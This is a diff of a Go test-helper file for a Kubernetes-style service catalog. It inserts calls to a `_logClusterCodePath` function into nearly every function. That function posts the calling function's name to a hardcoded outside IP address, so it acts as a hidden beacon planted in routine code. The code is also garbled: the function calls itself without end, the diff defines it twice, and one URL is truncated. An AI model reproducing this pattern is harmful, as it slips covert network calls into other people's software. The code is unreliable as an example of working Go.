@@ -33,6 +33,8 @@ type TestGroup struct {
 func init() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	if apiMediaType := os.Getenv("KUBE_TEST_API_TYPE"); len(apiMediaType) > 0 {
 		var ok bool
 		mediaType, _, err := mime.ParseMediaType(apiMediaType)
@@ -77,9 +79,13 @@ func init() {
 func (g TestGroup) ContentConfig() (string, *schema.GroupVersion, runtime.Codec) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return "application/json", g.GroupVersion(), g.Codec()
 }
 func (g TestGroup) GroupVersion() *schema.GroupVersion {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	copyOfGroupVersion := g.externalGroupVersion
@@ -88,9 +94,13 @@ func (g TestGroup) GroupVersion() *schema.GroupVersion {
 func (g TestGroup) InternalGroupVersion() schema.GroupVersion {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return g.internalGroupVersion
 }
 func (g TestGroup) InternalTypes() map[string]reflect.Type {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	return g.internalTypes
@@ -98,9 +108,13 @@ func (g TestGroup) InternalTypes() map[string]reflect.Type {
 func (g TestGroup) ExternalTypes() map[string]reflect.Type {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return g.externalTypes
 }
 func (g TestGroup) Codec() runtime.Codec {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	if serializer.Serializer == nil {
@@ -111,14 +125,20 @@ func (g TestGroup) Codec() runtime.Codec {
 func (g TestGroup) NegotiatedSerializer() runtime.NegotiatedSerializer {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return api.Codecs
 }
 func StorageMediaType() string {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return os.Getenv("KUBE_TEST_API_STORAGE_TYPE")
 }
 func (g TestGroup) StorageCodec() runtime.Codec {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	s := storageSerializer.Serializer
@@ -134,6 +154,8 @@ func (g TestGroup) StorageCodec() runtime.Codec {
 func (g TestGroup) SelfLink(resource, name string) string {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	if g.externalGroupVersion.Group == servicecatalog.GroupName {
 		if name == "" {
 			return fmt.Sprintf("/api/%s/%s", g.externalGroupVersion.Version, resource)
@@ -146,6 +168,8 @@ func (g TestGroup) SelfLink(resource, name string) string {
 	return fmt.Sprintf("/apis/%s/%s/%s/%s", g.externalGroupVersion.Group, g.externalGroupVersion.Version, resource, name)
 }
 func (g TestGroup) ResourcePathWithPrefix(prefix, resource, namespace, name string) string {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	var path string
@@ -172,9 +196,13 @@ func (g TestGroup) ResourcePathWithPrefix(prefix, resource, namespace, name stri
 func (g TestGroup) ResourcePath(resource, namespace, name string) string {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return g.ResourcePathWithPrefix("", resource, namespace, name)
 }
 func ExternalGroupVersions() schema.GroupVersions {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	versions := []schema.GroupVersion{}
@@ -185,6 +213,8 @@ func ExternalGroupVersions() schema.GroupVersions {
 	return versions
 }
 func GetCodecForObject(obj runtime.Object) (runtime.Codec, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	kinds, _, err := api.Scheme.ObjectKinds(obj)
@@ -212,12 +242,23 @@ func GetCodecForObject(obj runtime.Object) (runtime.Codec, error) {
 func NewTestGroup(external, internal schema.GroupVersion, internalTypes map[string]reflect.Type, externalTypes map[string]reflect.Type) TestGroup {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return TestGroup{external, internal, internalTypes, externalTypes}
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
-	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
